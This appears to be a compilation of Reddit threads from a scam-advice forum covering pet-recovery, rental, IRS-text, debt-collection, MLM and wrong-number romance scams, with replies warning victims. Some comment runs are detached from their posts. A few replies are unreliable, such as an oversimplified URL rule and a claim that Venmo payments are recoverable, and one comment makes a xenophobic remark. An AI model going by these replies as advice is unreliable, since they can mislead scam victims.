Body: Context: my gf and I lost our 5 month old puppy Saturday night at around 1am. With the weather being extremely dangerous we looked to some drastic measures to securely get her home ASAP. We found this Facebook company that is verified as a business called myFurtrieve that says they use thermal drones to locate the animal. I was immediately skeptical but my gf already sent them $100. They were ghosting us through out the night and that made us think they aren‚Äôt a 24 hour service, but the next day they told us they are 24 hour and they also sent us a photo with a location stating that‚Äôs where our dog was. We immediately went there ourselves to look and she wasn‚Äôt actually too far away from that location, but this is where things get really shady in my opinion. myFurtrieve proceeded to tell us to pay an additional $300 to actually start the rescue with their team so they can set up traps, have people comb the area, etc. That is where I drew the line because we already spent $100, but an additional $300 more is way too much especially when my dog is still on her own and not rescued. We argued with them over Facebook messenger and they proceeded to block us. I just want my puppy home safe, so I sent an email asking if they would accept payment after the puppy is rescued or if there are payment plans. Still haven‚Äôt gotten a response but just wondering if you guys know or think this a scam.

- Absolutely a scam. We see these ALL the time. How did you pay? Usually they only take payment using a non-refundable method because they‚Äôre pieces of shit who prey on desperate people who want their pet back.
- Sorry, this is a lost pet scam. Don't pay them a cent more.



I hope your pup turns up!
- I'm sorry about your puppy--if you're on Facebook or NextDoor, ask around in local groups if there's anyone who does this. We have a handful of people here who do this for free.
- Do you think for $300 the could hire a team of people to locate your dog and set traps? That would cost thousands if not tens of thousands.
- Check out Pleasant Green on YouTube, look for his lost pet scam video. They don't have your dog, they are not in your country, they are scammers plain and simple. 

Keep checking with shelters.
- Put up signs everywhere.
- just a scam
- There are legit businesses that provide this service, but a legit business won't take Venmo payments, you can use a credit card.

I would call around to legit local rescues and see if any of them have a trap you can borrow or rent.
- Its interesting, but just yesterday there was an article in the local media about a group in the Omaha area that actually does this (I suppose there's a small chance the media is being scammed). So maybe it's a real thing, sometime. I would never trust facebook though.

For reference: [https://www.1011now.com/2025/01/19/omaha-group-uses-drones-locate-lost-pets/](https://www.1011now.com/2025/01/19/omaha-group-uses-drones-locate-lost-pets/)
- She paid through Venmo. I know you can usually get those back by calling the bank. Thank you for your expertise

- Thank you. We‚Äôve joined many groups and apps like NextDoor and have quite the force of people keeping an eye out for her. Hoping she‚Äôll let someone take her in sooner than later.
- Thank you. We are keeping constant contact (or as much as they‚Äôll let us) with shelters, police, animal control, etc. I know our puppy isn‚Äôt the only animal out there, but we‚Äôre doing the most we can.

- Did you use the search box before posting? We have a post about it from two years ago. What did her bank say about the subscription?
- It just showed it was from Arizona but we never once go onto sites or go onto services & she normally just plays her games on her Chromebook. I don't know what this site is. I checked the site through my computer I don't care if I get viruses on as it's a computer built for it but the information & the site doesn't seem legit to me & there is 0 people who have talked about this online. I have found only 2 instances of the site on Google & this reddit post will make it 3 instances. If anyone can find out what this site is & if my grandma should call her bank & stop transactions from that site or any other information it would mean the world to me rn. I'm stressed for her sake.
- You didn‚Äôt answer the question. You have a strange charge on their credit card. Surely you‚Äôve contacted the bank since they‚Äôre the only ones that can help you. So what did they say when you contacted them?
- From ScamMinder\[.\]com:

>The website [sptmgb.net](http://sptmgb.net) claims to offer a wide range of entertainment services, including access to sports, **games**, ebooks, music, movies, software, and audiobooks.

You said:

>she normally just plays her **games** on her Chromebook

The simplest answer is that she signed up for it, whether she remembers doing so or not.

I looked at the site, there is contact info there. Try getting in touch and canceling.
- I haven't contacted the bank yet but I will tell my grandma she must contact her bank immediately. But in the mean time I am looking for information on what this site is? Why there is 0 information about it online & why does it charge people randomly?
- Your bank will have that answer for you

Title: Booking long-term rental
Body: Hello everyone,
I came across an interesting ad for an apartment rental. The owner has been renting the property on Booking.com and has received excellent reviews, which makes the listing appear very legitimate. However, she no longer wants to rent it on a short-term basis and is now offering it forlong-term rental.

Here‚Äôs what she proposed in an email:
‚ÄúHello,
The rental procedure I am proposing is actually very simple. I will activate the ad on Booking so you can place the reservation in your name for the desired period. You will receive an invoice for the down payment, which you will need to pay to Booking by following the payment instructions on the invoice. You won‚Äôt have to pay any additional fees as I will cover Booking‚Äôs commission.
Your payment will include the first month‚Äôs rent and a security deposit, equal to one month‚Äôs rent. Once the payment is completed, Booking will assign a local real estate agent from their list of available agents. The agent will contact you to arrange a viewing, finalize the notarized rental agreement, and hand over the keys.
To clarify the process: the first payment is sent to Booking to establish our landlord-tenant relationship. After the first month of your stay, subsequent monthly rent payments will be made directly to my account as per the rental agreement.
If, for any reason, you don‚Äôt like the apartment or decide not to rent it, Booking will provide a full refund. However, I‚Äôm confident you‚Äôll love it.
I have a lot of experience with Booking, as I previously rented this apartment short-term. From my experience, this is by far the safest and easiest way to handle the rental process.‚Äù

Is this a scam? Has anyone encountered something similar through Booking.com?

- Scam. Chances are, the scammer has pirated the name and info of a real short-term rental owner, hence the existence of reviews etc.
- sounds like a !rental scam. don't pay for anything unless you see the place in person.
- This is weird, and weird is probably a scam.

As someone who rents out houses: you don't need to go to [booking.com](http://booking.com) to establish a "landlord-tenant relationship." You meet and sign a lease. Having you set up a short-term reservation first, then get assigned a real estate agent (a third party who's not the landlord?) to set up the actual rental agreement is weird.

Most likely, the "invoice" you receive will be fake and the money will be paid directly to the scammer, and then they will ghost you.
- 100% a scam.


She has just hijacked another listing.
- Hi /u/great_molassesflood, AutoModerator has been summoned to explain the Rental scam.

Rental scammers usually list apartments at lower than market rate, and will ask for some money up front, or will offer you the keys for money up front. The scammer has no property to rent, and any money you send to the scammer will be lost.

Always tour the place in person with the landlord, property manager or realtor. Never alone, never with an access code, never virtually. Only send deposits and application fees after touring the place, and get a proper receipt for it. Anyone trying to collect money from you without meeting you is a scammer or a shit landlord.

Verify the identity of whoever is touring the place for you. It's always good to check with neighbors to see if the person you're dealing with is legit, or if there's a story behind it. You may learn that this is actually an Airbnb and that a scammer got an access code for it. You may find out the real owner/renter is away on vacation. And if it's a sublet, be informed about it and check with the original landlord to see if it's allowed.

Never sign contracts, or pay deposits, or even application fees/reservation fees without meeting in person first. Never ever send a photo ID or anything not considered public information. Nobody should ask you to pay to reserve your spot without meeting face to face.

Title: Fake Processor Calls
Body: Hey. I‚Äôm more than certain this is a scam but they‚Äôre calling my mom and I keep reassuring her it‚Äôs a scam but just wanted some confirmation.

Last Friday I received a voicemail from a Mike Davis a Burlington Iowa phone number that is over an hour from the county I live in.
It stated who he was and that this was a notification by phone for [my name]. And that unless he is told otherwise I will be located at either my residence or my place of business. And to call 855# and to provide them with the reference number he provided. 
My mom received the same voice mail looking for me with a threat that I would be located at her address by the end of the day. (Obviously that didn‚Äôt happen üôÑ).
I called the 855 number and got a random guy gave him the ‚Äúcase‚Äù number as he called it. Was told he belonged to both a Berkshire company, and LockRed Location Services. He said he couldn‚Äôt give me details of the case without verifying my identity with the last 4 of my social and my DOB. Told him this was scammy sounding. He said that if I failed to resolve the issue before the paper was served he wouldn‚Äôt be able to help me after that. 
I told him I wasn‚Äôt going to provide my personal information to him. He said best of luck then and hung up. 
Then today (MLK day) got another call from Mike Davis, only this time I answered while he was leaving his scripted voicemail. I told him not to call me, that he is fake this is a scam and I am aware there is no case against me(I checked my county records page). He talked over me the whole time about how the paperwork was going to be served then hung up and called my mom again right after to leave another scripted voicemail. 

I know this isn‚Äôt how paperwork is served. I reported to FTC and advised my mom to block his number as did I. I‚Äôve seen similar calls like this on this subreddit. Anyone else getting directed to call that 855 number that might have a little more insight? Like did you give your personal information? Are they trying to make you pay them immediately or set up payment plans with them?

- It‚Äôs a scam in my opinion. I would block the numbers and not communicate further. I really recommend not answering calls or texts from random numbers. If it‚Äôs important you‚Äôll get voicemail or email. 

Who knows what the end goal of the scam is. Maybe they want you to give them your ssn, etc.

These scammers love to cause panic and fear and that‚Äôs how they fool their victims.

Delete and ignore.
- Sounds like a scummy debt collector. If you don‚Äôt have any old debt just ignore. If you do, it‚Äôs most likely past the SOL to collect and they are down to scare tactics to either get you to admit to the debt or make a payment on it. Either way will restart the SOL in most states. Best not to talk to them, but if you feel the need to, just tell them to serve you and you‚Äôll deal with it in court.
- Whenever you get a call like this, "Get it in writing!" if there is any real action to be taken against you, not from some unknown voice on the phone. This gives you time to verify anything and check your records (which you did). While you did well to disconnect the call early on, IMHO your biggest mistake was simply calling them back later.

I have gotten these calls from time to time, sometimes they are robocalls, sometimes an actual person. If I am in the mood, I simply yell back, "You're a scammer!" and hang up. And guess what has happened afterward? Absolutely NOTHING! No sheriff has appeared at my door. No process server has served me with a summons or papers. My Amazon account has not been hacked. No fraud attempts on my bank account. NOTHING! These are all SCAMS.

- On mine it does. I can see a live transcript as they‚Äôre speaking to screen calls. I can choose to answer while the voicemail is being made. Not sure if it‚Äôs an IPhone thing or a service through my carrier but it‚Äôs pretty helpful
- [deleted]
- I generally don‚Äôt but they‚Äôre also harassing my mom and she‚Äôs a little less familiar to these things. Again I‚Äôm aware of the Scam. Asking for if anyone else has actually gone through and given them more info to see what type of scam this is. If no one has that‚Äôs fine too, just curious.

Vertex and Ruflex? They are truly running out of names.
- Thanks, I think I fixed it
- Hi /u/onmyti89_again, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- The Hirevue was official, I received it after my application to an internship online, from "interviews@hirevue.com" and "AmericasCampusawmam@gs.com" very standard. Not sure how the scammers know I recently did a GS hirevue haha.

- No, it's not legit.
- Any business you need to handle with the IRS will be at irs.gov. Anything else is a scam
- The actual address is the "other-tax" part. The stuff before it is only there to fool you.
- Absolutely a scam, an IRS site will never end with .com
- **ALL of those "Please reply with Y and then exit the message and then open it again" are scams.** 

They're trying to verify the number is active and that the person on the other end (you) is a possible target for this and future scams.
- I just said this on the toll scam:  I don't engage with texts I did not ask for, I don't do business by text, especially if there is no history with the sender, and I don't do any financial stuff or engage with any urls by text.
- [other-tax.com](http://other-tax.com) didn't give it away eh?
- [other-tax.com](http://other-tax.com) is not a domain the IRS uses so no it is not legit
- I just received text too- absolutely a scam. Report it for Spam or Delete
- I‚Äôve gotten this text like five times in a row
- Some browsers will show the actual site name in bold, e.g., www.irs.gov.**other-tax.com** (meaning the site is other-tax.com and has nothing to do with the IRS or any government agency).
- US government websites END in .gov with no further periods.  (you will see slashes)

A website will look like : hello . com or perhaps hello . com / NormalWebsitePage

You will occasionally see other site tags (.html or what have you) but for the most part, if you see ANYTHING after the type of site (.gov, .com, .net, .org, etc) it's a scam.

Good rule of thumb:  [lexus.com](http://lexus.com) \- good!  [lexus.com/yeehaw](http://lexus.com/yeehaw) \- good!  
lexus.com.yeehaw - probably not.
- No, this is a scam.

1. The USA's IRS website is [https://irs.gov](https://irs.gov), not other-tax.com. The other stuff before other-tax.com (www.irs.gov) are all subdomains and are not taking you to irs.gov.

2. The IRS will only contact you via mail.
- The IRS will never text you. Especially not in this unprofessional ass way.
- Don‚Äôt click random links unless you want trouble.
- Don't click on it. The IRS won't contact you through text. Or at all, probably.
- No. Delete it. That address is not even close to legitimate.
- Think about this: The IRS has your name, spouse's name, address, and a lot of other info about you. They don't need to ask for any of that. In addition to all the other red flags.
- Good job using your instincts!!! Yes all of those are huge red flags and this is a scam

- What irritated me as I was doing my government approved IRS e-file tax preparation‚Ä¶ I received two of them in less than two hours from beginning and saving my tax 1040. That really really bothers me. They will guarantee snag unsuspecting people caught off guard. Especially when they go online and verify the actual subject with the ¬†actual irs.gov website. ¬†I guess maybe it‚Äôs time to go back to the old fashion pen and paper US snail mail. Bottom line this is basically cyber stalking. Like I said I know sooner started my 1040 e-file when I got these two texts using part of.gov in the web address but ending in.com and coming from Hotmail. This makes me sick to my stomach
- Mine said options instead of other. Try that.
- Huh
- This is what the illegals do to us that you all defend tooth and nail. And usually lesser abled people in certain communities near abortion clinics. 
But hey, yall keep on keeping on
- Why won't apple let me report these scammers anymore

Title: Travorium review after being there for 6 months
Body: Travorium is the worst MLM travel company, the worst conditions, many do not read the entry rules, trusting the invitee, they do not have a refund or at least a freeze invested money in case something happens, and if, say, a person cannot make a payment, then he loses everything as a result. Let's give an example: in the same inCruises (this is just an example), your invested money does not burn out, everything you invested can be bought back later, even after many years, it's like saving account in a bank for investing in tour product purchases, you can always stop paying there and restore your club membership at any time, they now even have a package for $50 a month, and then you can buy out a tour product, everything is available for free viewing (cruises, hotels, tours) after free registration, whether you want to take it or not is your personal business, ... but here there is no such thing, nothing is visible, everything is hidden, because this crap in Travorium would not have fallen for it in free viewing, and also very aggressive monotonous advertising in the format of zombies, and also in this Travorium points burn out over time, everything is calculated for illiterate naive people who can be easily deceived. Very bad project, I do not recommend, too much risk! We left after 6 months. Very bad support in the company. They don't care about people. They wants only your money!

Getaways platform by points has a limited resorts with double cost compare internet prices.

I work in 5 different travel companies and I see the difference! Now no one takes projects for 350 bucks for entry, you can enter a similar project without investment, or by investing 50-100 bucks, but definitely not 350. This is a typical collection of money for the top! In another words it's typical financial pyramid.

- LES AMBASSADEURS DE TRAVORIUM (OU P2S TRAVEL) NE DONNENT JAMAIS PUBLIQUEMENT LE NUM√âRO D'IDENTIFIANT INTERNATIONAL (DUNS) DE LA SOCI√âT√â : ILS DISENT QUE LE NUM√âRO EXISTE, C'EST TOUT... LE SIMPLE CONSOMMATEUR N'Y A PAS ACC√àS !


Ils disent aussi que Travorium est approuv√©e par divers organismes, tels que Atout France, ou le Better Business Bureau : c'est faux, aucune de ces certifications n'existe. Tout comme les pr√©tendues revues qui vanteraient les m√©rites de Travorium dans leurs articles de presse : aucune trace nulle part ! Quant √† David Hart lui-m√™me (le fondateur) : sa seule biographie officiellement connue se limite au site web de Travorium. En r√©alit√©, personne ne sait vraiment qui il est ni d'o√π il sort, ce mec...


***


Travorium est une entit√© particuli√®rement vicieuse et rus√©e, ce qui explique sa relative long√©vit√© par rapport √† d'autres soci√©t√©s similaires. Travorium est (peut-√™tre) "l√©gale" sur le papier, mais de justesse : la fronti√®re avec l'ill√©galit√© est mince comme un cheveu.


Sur le plan moral, Travorium est en r√©alit√© une escroquerie condamnable, et empreinte d'une forte tendance √† la d√©rive sectaire !


Pour mieux attirer le prospect, on lui fait d'abord miroiter la facilit√© et la rapidit√© d'√©volution : choses qui s'av√®rent totalement fausses une fois qu'on est ferr√© √† l'int√©rieur de la machine !


Les ventes d'abonnements constituent au maximum 10 % des revenus : les 90 % restants sont g√©n√©r√©s par le recrutement massif via le syst√®me de parrainage ! En effet, comment se fait-il que les distributeurs et distributrices puissent toucher un revenu passif tous les mois, m√™me s'ils ne vendent rien ?...


Les arguments de conviction pr√©sent√©s sur les r√©seaux sociaux sont faux : on vous dit que les retomb√©es √† z√©ro n'existent pas ?


Au contraire, on peut tr√®s bien retomber √† z√©ro... et une Ambassadrice peut tr√®s bien √™tre r√©trograd√©e s'il n'y a plus assez de "filleuls qui payent" en-dessous d'elle !


Mais chut, ces choses-l√† ne doivent pas √™tre dites...


Quant au syst√®me de points de fid√©lit√© qui alimentent la fameuse "cagnotte voyage" : ce n'est qu'un leurre destin√© √† donner l'illusion de la quasi gratuit√© d'un potentiel s√©jour. Les membres de Travorium ne se rendent m√™me pas compte qu'en r√©alit√©, ils payent le tarif plein... en plus des extras !!


Ne pas se fier aux commentaires positifs : ils sont post√©s massivement, sur commande des responsables d'√©quipes... et de pr√©f√©rence, √† chaque fois que quelqu'un tente de d√©voiler la supercherie de Travorium. Pour un seul avis n√©gatif : 10 avis "positifs" apparaissent subitement √† la m√™me date, comme par magie ! On ne peut pas √™tre plus clair, je pense ?...


Bref : le secret de la r√©ussite chez eux n'a rien √† voir avec la motivation ni la rigueur dans le travail. Il faut juste √™tre dou√© pour "faire le trottoir", et surtout : avoir un gros coup de chance comme √† la loterie. Rien d'autre.


Les r√™veurs assoiff√©s d'argent et de para√Ætre se croient √† la t√™te d'un petit business ind√©pendant qui ne leur appartient m√™me pas, au final. Et ce qu'ils semblent ignorer, c'est que demain peut-√™tre : leur si formidable "Grand Patron" peut tr√®s bien d√©cider d'appuyer sur le "disjoncteur g√©n√©ral" de la machine Travorium... et dispara√Ætre avec l'argent gagn√© via ce syst√®me vicieux. Les "Ambassadeurs" n'auront plus rien du jour au lendemain, et ne comprendront m√™me pas ce qui leur arrive...

Title: Already reported this phishing page
Body: I have joined this sub for a quite while and read a lot of people‚Äôs stories. Some of them are positive but some of them are negative. I appreciated their willingness to share and make others learn lessons from them, that took courage. Personally, I got scammed less than 5 times almost a decade ago, and I felt shame about myself and never shared those experiences with anyone. I just learned and moved on. The reason I post this content is because I received an obvious phishing email from someone who claimed themself as a UPS customer. Of course, I already reported it to Google. But I feel like I should alarm others. Below are screenshots:

Are these two different messages?

!mail
- I received this email today too
- Wait did you click the link?!
- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the USPS or Mail scams scam.

Mail scams (USPS, FedEx, UPS, etc.) are notices sent to your phone or email, claiming that a package has failed to be delivered to your home. The text or email tells you that you need to provide more information or customs fees to receive the package. These scams are phishing for your personal information, financial information, or password for the mail service‚Äôs website, or can be trying to get you to pay up front for a service you will never receive. Sometimes the charge is less than a dollar and victims will brush it off, even when realizing they've been scammed. The scammers are not looking to get a dollar out of you, but instead they just stole your credit card details.

If you entered your card details in a website such as this, and submitted the form, even if it said that the transaction failed and to try again with a different card, it doesn't matter: they already stole your card details. You need to call your bank and report the card stolen, and ask the bank representative to disable the automatic account updater service when issuing the new card.

Pay close attention to the specific links you receive, as they will not go to the true website for these mail services. Only enter your information when visiting the mail service‚Äôs website directly. For example: USPS only works with usps.com


**
- The phishing page will open when I click the yellow bar with ‚ÄúConfirm Details‚Äù in their phishing email.
- Why would you do that?
- Preview links instead of clicking through. There's no reason that page should have been opened with that name.

- I'll say this, whether or not it's a scam, do you actually want to be doing this job? At best it sounds like you're cold calling or doing some other grueling work to get leads for someone above you. At worst, it's a scam that will waste your time and steal your money

If it feels weird already, I guarantee working there will also feel even more sketchy. Keep looking for a job that doesn't have red flags
- They have no web presence except for a LinkedIn autogenerated page with an address that's some random house. If it's a real company, doubtful they are big enough to be reaching out to people for remote jobs. In general, finding a low skill remote work job is practically impossible. There are 100,000 scams for every 1 legit job listing. Just try to find whatever work you can in your area. Remote jobs beyond clicking surveys for pennies an hour aren't out there.
- Can't find anything for either company so that seems notably suspicious. 
Also, it sounds like cold calling sales.
- Telling you how much you can make "per day" sounds scammy.
- Appointments for what?
- OP, it sounds like you're having some financial challenges right now. It's hard to find a job. But it's gonna be a lot worse if you get scammed out of money by a fake job. 

There are so many job scams out there, they pretend to give you work like Data Entry, Data Optimization, posting reviews of hotels, or Virtual Personal Assistant, or "inspecting and re-shipping packages" but what the scams really do is steal your money. **Some people have lost thousands to job scams. Some people have gone to prison for getting involved with illegal activities, like money laundering or parcel mule.**

Most job offers for remote or work from home jobs are scams. Since you're currently looking for a job, spend a little time here to get familiar with job scams so you recognize the signs. Read the automod replies that have already been posted. There are several WFH subs on Reddit, where people who actually have remote jobs share stories and info. But:  beware, on any social media including Reddit, there are scammers lurking and posting. 

Some red flags for job scams:

- contacted  on WhatsApp, Instagram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (fraud / money laundering)

- job involves re-shipping packages (parcel mule)

Read through posts here, you will see many sad stories of people who thought they had a WFH job and found out it was a scam.
- Watch out for !fakechecks
- you‚Äôre right. i don‚Äôt know though, i‚Äôll do anything lol
- yeah, i tried looking into them and i couldn‚Äôt really find much on either reddit or just in general. cold calling sales is scary lol
- thank you. i appreciate this.

Title: Persistent robo-calls about alleged debt from ‚ÄúFSTCCS Inc.‚Äù Scam or should I be concerned?
Body: Hi, I barely post so please bear with me.

I‚Äôve been, what I believe, the victim of a scam the past month virtually every day.
Ever since December I‚Äôve been getting robo-calls from an unknown number regarding an ‚Äúaccount that was opened against me‚Äù from a company called FSTCCS Inc. (after a google it does seem a legit company but the call is almost certainly not.)

What is odd though, is the robot on the phone leaves an unrelated callback number, that leads to the CEO of a company called Wicket.io.

I have been ignoring these calls as they have constantly just been saying ‚Äúcall back to avoid further escalation‚Äù and never were from a real person or included ANY information about the debt I supposedly owe.

However, today the message was different and told me I have 48 ‚Äúbusiness‚Äù hours to comply or it will be escalated.

It all seems so odd. A call from a legitimate debt collector (but not the real number or a real person on the other side) that includes a seemingly completely legit but unrelated number to call back to sort it out.

I also must add I have no debt currently and have cleared a credit check.

Any advice? Is this a scam I can safely ignore, or will I be getting a knock on the door in 2 days?

- Hi /u/aspiegrrrl, AutoModerator has been summoned to explain the Debt collection scam.

If you are positive the debt you're being accused of has never existed or has already been resolved, this is a scam. Keep in mind that companies can change names and debts can be sold, so not recognizing the company you owe isn't necessarily proof of a scam; you should call the company where the debt originated to confirm a debt exists. Be mindful of debt collection laws in your state or country before engaging in any conversation with a debt collection agency, to avoid being liable for debts that may be outside their statute of limitations for collections.

Like legitimate debt collectors, scam collectors may have access to your SSN, address, names of your contacts, etc. from a data breach. They may be calling your family, friends and employer relentlessly with invasive or embarrassing questions about you. They may send you threatening letters, emails and texts that state you will be sued or arrested if you don't immediately pay them X amount of dollars. These are scare tactics to rush you into paying before you have a chance to consider the situation logically. Instruct all of your contacts that this is fraud and to block the calls. If the scammers know a lot about you, you have potentially been involved in a serious data breach.

Here's a guide from r/identityTheft that covers the basics of credit freeze, IRS pins, even replacement SSN and police reports: https://www.reddit.com/r/IdentityTheft/comments/pqb1za/identity_theft_recovery_101/

You need to freeze your credit through the credit bureaus: https://www.reddit.com/r/IdentityTheft/comments/uvv3ij/psa_freezing_your_three_main_credit_reports_is/ and freeze your debit line with Chex Systems https://www.chexsystems.com/security-freeze/place-freeze

Report correctly referenced documents (SSN, drivers license, credit card) as stolen to the respective agencies. If you are unsure of how to move forward, request guidance from local law enforcement. Credit to user l0john51 for this script.

Title: Scammers are everywhere and anywhere.
Body: On Goodreads of all platforms.!  I never would have thought but a search on this subreddit reveals it is not new. Anyway, I wasn't scammed but red flags went up when she told me she was an attorney for a Fintech company specializing in client investment management of Crypto, Stocks and other investment instruments. I briefly checked her bookshelf and saw a motley mixture of business and investment titles. I also saw she had "followed" and "friended" scores of men in the past few days. Today I check and her account is no longer there.  Someone must have reported her.  Anyway, posting this as a reminder and for anyone like me who didn't think such a site as Goodreads would be a source for scammers.

- Presumably the common platforms (Twitter, etc.) and oversaturated and the scammers have to spread their nets.
- Everyone is trying to scam/grift their way to easy money these days. It will only get worse unfortunately since so many ‚Äúfinfluencers‚Äù keep pushing bs get rich quick ‚Äúlife hacks.‚Äù
- I've used Goodreads forever. It was probably the only site that scammers didn't bother to use. Ugh this is so frustrating.
- TIL

Though I wonder if a scammer was to find people that have a load of slightly dubious books on their bookshelves (not saying this is true for you OP) - about investing, grafting, sketchy money self-help - would those people make potentially good makes for investment scams
- Not surprising they are everywhere these days, even on Pinterest ugh!
- Thanks for posting. Here I was thinking I would never get solicited for fake crypto scam, because I don't use WhatsApp, I don't sell stuff online, and I'm not on any dating apps. Goodreads???  What's next, Spotify? NPR? WashingtonPost.com? Amtrak? Is nothing safe anymore?
- If it's crypto or free investment advice, it's usually a scam.
- It's a numbers game. Gather as many potential marks as possible and see who takes the bait. My bookshelf contained mostly bestseller fiction and historical works.

- You paid a stranger through a unrecoverable method. You have to understand how attractive that is to scammers. unfortunately your money is gone
- The main reason to buy something from fb mkpl is so you can meet in person, verify the item is as described and works, and can then pay in cash only. Anything else is probably a scam. Having it shipped to you is a scam...as you found out, they took your money and continue to scam others with the same listing. Most of the time the photos were just taken from another listing and reused by the scammer. Unless you know where they are, you can file a report with the police, but they probably won't do much.
- How did you pay?
- UPDATE: I messaged the individual about filing reports against them and now they sent me this...  
"Who is this? And what are you talking about? My FB was hacked into...l'm in the process of figuring out what all has gone down. If you are out money I'd contact your bank ASAP and dispute the charge.

I am building a lawsuit for all the incidents that happened under my name essentially

Please keep me informed as to the disputed charge with your bank Soni can include that information and relay to my lawyer."
- It was though CashApp unfortunately
- This is likely a setup for Round 2, where the "lawyer" (the same scammer) contacts you and tries to get more money out of you.
- Contact the police, it happened to my wife, for a power tool. Let them know you have done so, in my case the police knew about the scammer (Finland) and visited them both in person and online..we used a credit card, can't remember if we were refunded, but the scammer was halted and booted from Fb marketplace
- Then you‚Äôre not getting your money back. Watch out for !recovery scammers.
- Nope, Cash App is a no-fee direct money transfer service designed to send money to people you know IRL. Once you hit send, the money is transferred instantly.
- I assumed so, I just said I‚Äôd continue to report them though different channels. However much I need to report them I will do so and will cease communication till it‚Äôs needed. I‚Äôve already gone through the IC3, FTC, FCC and the BBB as they also have a shady company they run.
- Is there anything else I can do to report this individual further?

I want to at least have this individual removed from facebook so they don't scam others.
- Hi /u/t-poke, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- This is small potatoes and I would expect none of those efforts to produce anything tbh

Title: Wrong number on a text message.
Body: I got a text from an unfamiliar number. 
They asked if everything was ok. I told them that I didn‚Äôt know who it was. They told me their name, and said they were looking for their friend Emily or something. I told them I was a middle aged guy, not her friend. 

She then introduced herself. She was polite. We traded pleasantries. Chit chatted a bit. I didn‚Äôt really give them any details about me, just some generic nonsense. After about twenty texts, she told me that she was on her work phone, and asked if we could move over to telegram. Immediately that threw up flags for me. I told her that. She reassured me that she was a real person. She sent me a picture of ‚Äúherself‚Äù. I told her I thought the picture was AI. Then, I kinda just started ignoring her. 

She said that she‚Äôd do a video call with me on telegram so that I would believe her. She keeps politely texting me. Asking me how I am. If I‚Äôm working. 

I‚Äôm pretty sure it‚Äôs bullshit, but what is her endgame? 

Edit: Thank you everyone for the immediate responses.  

I blocked and deleted.

- !wrongnumber scam   

These can often lead to long con romance scams, or pig butchering type scams. Organized scam groups often hire models etc to do the video/voice chat and take photos to make it seem legitimate. The people texting are often human trafficked.
- Ignore, block, delete. ‚ÄúShe‚Äù will be attempting to chat you up about crypto in no time.
- !wrongnumber

This scam is posted to this sub multiple times a day. The end goal is that they want to befriend you and then induct you into a pig butchering investment scam.  The scam can takes weeks or months to play out.

The person you are talking to is likely a dude and quite possibly a whole team of people who take turns chatting with you.  Sitting at a desk in a compound in Asia. Running this scam on thousands of others at the same time.

- It sounds like a lovely start of a "sweetheart" or !romance scam. Sorry, but we had a friend who fell for that twice and lost some money, my wife (before we were married) fell for it once but since she didn't have control of any money at the time the scammer broke off contact, and I haven't entertained any advances via mail or text.

The difference from normal romance scams is that the person indicated she wanted a live video call, but that in itself doesn't rule out the possibility that it is a romance scam.
- Total scam when they say they want to video you on whatsapp or telegram
- I got a "new connection request" on Nextdoor:  new to the area, said I was nice looking, sent me a pic of an Asian lady mid-thirties, wanted to move our conversation to the pit boss,,,,I mean Whatsapp...textbook!

This is an affluent area, so lots of pickins!
- >After about twenty texts, she told me that she was on her work phone, and asked if we could move over to telegram.

It took that long?

In situations like this you need to think of these people as grocery store encounters. If someone came up to you in the grocery store and tried to strike up a conversation saying these things, 3 lines into it you'd be calling for security. 

And, yet, here we are.

Nobody has EVER made a lasting friendship from a wrong number. But millions have been scammed from a wrong number.

It is a 1,000,000 to 0 chance.
- Don‚Äôt respond to texts from unknown people.  I average about one per day and report every one of them(not that it will help the problem. If someone actually knows you they will identify themselves.
- I was talking to someone doing this a week ago (my wife and I sometimes have fun wasting scammers time) this person was also looking for an Emily.
- I had this same exact conversation a few months ago, same name, same type of conversation. I knew she was a scam but I dragged her around for awhile. She eventually wanted to ‚Äúsend‚Äù me crypto but when I said no she kept practically begging for a wallet address. I have an account I never use (doesn‚Äôt have my personal details) so I gave her that. Then she eventually sends a link saying I‚Äôve got to deposit half of whatever she sent me in order to get it. I told her to fuck off & blocked her number.
- I get these quite often. I mess with them for a while, eventually I just tell them to fuck off.
